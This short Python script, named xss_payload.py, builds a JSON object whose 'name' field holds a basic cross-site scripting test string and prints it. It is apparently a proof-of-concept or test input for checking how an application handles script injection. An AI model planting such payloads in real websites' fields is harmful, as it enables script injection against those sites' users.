# xss_payload.py
import json

def generate_xss_payload():
    payload = {
        "name": "<script>alert('XSS');</script>"
    }
    return json.dumps(payload)

print(generate_xss_payload())
